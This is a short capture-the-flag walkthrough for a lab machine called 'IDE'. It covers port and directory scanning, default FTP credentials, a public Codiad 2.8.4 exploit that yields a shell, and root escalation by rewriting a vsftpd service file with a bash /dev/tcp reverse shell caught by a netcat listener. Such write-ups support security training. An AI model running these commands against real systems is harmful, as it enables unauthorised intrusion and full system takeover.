# IDE

## nmap scan

PORT      STATE SERVICE VERSION \
21/tcp    open  ftp     vsftpd 3.0.3 \
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) \
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu)) \
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) \
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel \

## ftp

Here we find the user "john" and the standard password "password"

## gobuster scan

!!on port 80 is nothing!! \
gobuster dir -u http://<IP>:62337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

/themes               (Status: 301) [Size: 324] [--> http://10.10.102.130:62337/themes/] \
/data                 (Status: 301) [Size: 322] [--> http://10.10.102.130:62337/data/] \
/plugins              (Status: 301) [Size: 325] [--> http://10.10.102.130:62337/plugins/] \
/lib                  (Status: 301) [Size: 321] [--> http://10.10.102.130:62337/lib/] \
/languages            (Status: 301) [Size: 327] [--> http://10.10.102.130:62337/languages/] \
/js                   (Status: 301) [Size: 320] [--> http://10.10.102.130:62337/js/] \
/components           (Status: 301) [Size: 328] [--> http://10.10.102.130:62337/components/] \
/workspace            (Status: 301) [Size: 327] [--> http://10.10.102.130:62337/workspace/] 

## codiad...

On http://<IP>:62337/ we see the title "codiad 2.8.4". \
If we do some research with "searchsploit" 
- searchsploit codiad 2.8.4 
We can download us the 49705.py exploit. 

## exploit

- python3 49705.py http://<IP>:62337/ john password <YOUR IP> <PORT> linux \
Do what the exploit is saying.. and now you got a shell. 

## privesc

- sudo -l show us "/usr/sbin/service vsftpd restart" \
Lets modify this file. 
"ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1'" \
Save it an reload the daemon. 
- systemctl daemon-reload 
- sudo /usr/sbin/service vsftpd restart 

On your machine start a netcat listener \
nc -lnvp <PORT> \

Now you are root!
